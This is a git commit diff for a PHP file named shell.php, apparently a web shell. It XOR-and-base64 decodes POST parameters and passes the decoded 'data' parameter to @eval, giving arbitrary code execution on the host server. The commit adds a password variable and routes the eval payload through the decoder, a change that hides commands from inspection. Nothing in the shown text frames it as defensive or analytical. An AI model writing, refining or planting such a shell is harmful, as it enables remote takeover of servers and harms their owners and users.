0324a090ec79f9b386494e44d175527d46641c04
RichardTang <30547741+Richard-Tang@users.noreply.github.com>
2021-01-14 21:07:52 +0800

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,16 +1,18 @@
 <?php
-$number=2;
+$pass = "data";
+$number = 2;
 function decoder($s,$number){
 	$res = '';
 	$s = rtrim($s,'/');
-	$s = explode('/',$s);
+	$s = explode('/', $s);
 	foreach ($s as $key => $value) {
 		$res .= chr($value^$number);
 	}
 	return base64_decode($res);
 }
 foreach($_POST as $k => $v){
-	$_POST[$k] = decoder($v,2);
+	if($k == $pass) { continue; }
+	$_POST[$k] = decoder($v, $number);
 }
-@eval($_POST['data']);
+@eval(decoder($_POST[$pass], $number));
 ?>
